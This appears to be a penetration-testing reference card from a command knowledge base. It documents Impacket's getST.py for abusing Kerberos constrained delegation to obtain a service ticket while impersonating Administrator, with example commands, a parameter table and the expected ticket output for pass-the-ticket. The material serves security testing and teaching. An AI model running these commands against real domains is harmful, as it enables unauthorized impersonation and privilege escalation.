---
id: d28af867-3e6b-4d4e-8972-63122ce9df74
name: retrieve-service-ticket-with-getst
type: command
executor: python
data: >-
  getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate
  Administrator -dc-ip 10.10.10.10
output: null
created_at: '2023-04-06T03:56:07.695237+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - kerberos
  - delegation
verified: true
validated: true
---

# retrieve-service-ticket-with-getst

## Command

```python
getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
```

## Description

Requests a Kerberos service ticket (TGS) for the specified SPN while impersonating a user, exploiting constrained delegation if permitted.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -spn | Service Principal Name of target (e.g., HOST/SQL01.DOMAIN) | Yes |
| 'DOMAIN/user:password' | Credentials for authentication | Yes |
| -impersonate | User to impersonate (e.g., Administrator) | Yes |
| -dc-ip | Domain Controller IP | Yes |

## Examples

### Basic Usage

```python
getST.py -spn cifs/dc.domain.com 'domain/user:pass' -impersonate admin -dc-ip 10.10.10.10
```

### Advanced Usage

Add output file: `getST.py ... -outputfile ticket.ccache`

## Expected Output

Service ticket saved as .ccache or displayed in hex/base64. Success: No AS-REQ failures; ticket exportable for PTT.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Impacket-GetST]]
